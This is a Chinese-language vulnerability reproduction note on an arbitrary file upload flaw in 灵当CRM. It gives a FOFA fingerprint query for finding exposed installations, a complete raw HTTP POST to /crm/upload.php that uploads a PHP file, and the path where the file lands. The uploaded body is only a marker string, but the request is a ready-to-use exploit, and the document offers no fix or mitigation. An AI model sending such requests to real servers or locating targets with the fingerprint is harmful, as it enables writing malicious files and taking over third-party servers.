# 灵当crm upload存在任意文件上传漏洞

# 一、漏洞简介
灵当CRM 是一款企业级客户关系管理软件。它旨在帮助企业管理客户信息、销售流程、市场营销活动和客户服务等。灵当crm存在任意文件上传漏洞，攻击者可以通过该漏洞写入恶意文件获取服务器权限。

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征

![1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a.png](./img/j8nQmcKhk10d4pW9/1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a-980852.png)

# 四、漏洞复现
```plain
POST /crm/upload.php HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----234561
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 149

------234561
Content-Disposition: form-data; name="file"; filename="aa.php"
Content-Type: application/octet-stream

234561
------234561--
```

![1724488643826-3811d571-231f-4716-afa1-4b1ccc1f1146.png](./img/j8nQmcKhk10d4pW9/1724488643826-3811d571-231f-4716-afa1-4b1ccc1f1146-899092.png)

```plain
/crm/recordData/20240824/aa.php
其中20240824为当前时间
```

![1724488682774-49825d41-a6b0-4d3b-9280-1734b8fa1b04.png](./img/j8nQmcKhk10d4pW9/1724488682774-49825d41-a6b0-4d3b-9280-1734b8fa1b04-648240.png)



> 更新: 2024-10-21 11:49:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ilggltsrlmmqkw8h>